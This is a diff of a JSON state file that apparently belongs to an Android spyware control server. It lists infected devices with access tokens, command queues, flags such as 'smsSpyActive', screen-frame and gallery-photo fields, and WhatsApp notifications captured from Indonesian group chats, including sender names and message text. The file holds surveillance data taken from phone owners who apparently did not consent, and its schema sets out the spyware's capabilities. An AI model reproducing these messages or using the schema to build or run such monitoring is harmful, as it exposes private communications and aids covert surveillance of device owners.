@@ -6,7 +6,7 @@
     "token": "5c459e8712f2a7ee2b4192ea89156763",
     "lastSeen": 1775048724276,
     "commandQueue": [],
-    "online": true,
+    "online": false,
     "connectedAt": "2026-04-01T10:32:40.020Z",
     "deviceInfo": {
       "model": "samsung SM-A556E",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1112 pesan): ~ joo",
+        "content": "iya",
+        "time": "01/04 23:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775058362728
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1512 pesan dari 14 chat",
+        "time": "01/04 23:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775058362690
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (1111 pesan): ~ syafa karamoy",
@@ -4003,22 +4019,6 @@
         "time": "01/04 23:26",
         "pkg": "com.whatsapp",
         "receivedAt": 1775057167492
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1379 pesan dari 14 chat",
-        "time": "01/04 23:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775057167338
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (999 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : iyeah\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 23:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775057165289
       }
     ],
     "galleryPhotos": [],
@@ -4051,7 +4051,7 @@
     "token": "ee7716168abf03ae6470b12578967076",
     "lastSeen": 1775048725351,
     "commandQueue": [],
-    "online": true,
+    "online": false,
     "connectedAt": "2026-04-01T10:33:59.233Z",
     "deviceInfo": {
       "model": "samsung SM-A556E",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1512 pesan dari 14 chat",
+        "time": "01/04 23:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775058362707
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (1112 pesan): ~ joo",
@@ -8056,14 +8064,6 @@
         "time": "01/04 23:26",
         "pkg": "com.whatsapp",
         "receivedAt": 1775057167353
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (1000 pesan): ~ 𝐀𝗻𝗮𝘀𝘁𝗵 𝐋avchīe",
-        "content": "Jenis pesan tidak diketahui",
-        "time": "01/04 23:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775057167323
       }
     ],
     "galleryPhotos": [],
@@ -8084,7 +8084,7 @@
     "token": "daf42186f9b9372d4384c6b203eb81f9",
     "lastSeen": 1775044512085,
     "commandQueue": [],
-    "online": true,
+    "online": false,
     "connectedAt": "2026-04-01T11:54:50.701Z",
     "deviceInfo": {
       "model": "TECNO TECNO KL4",
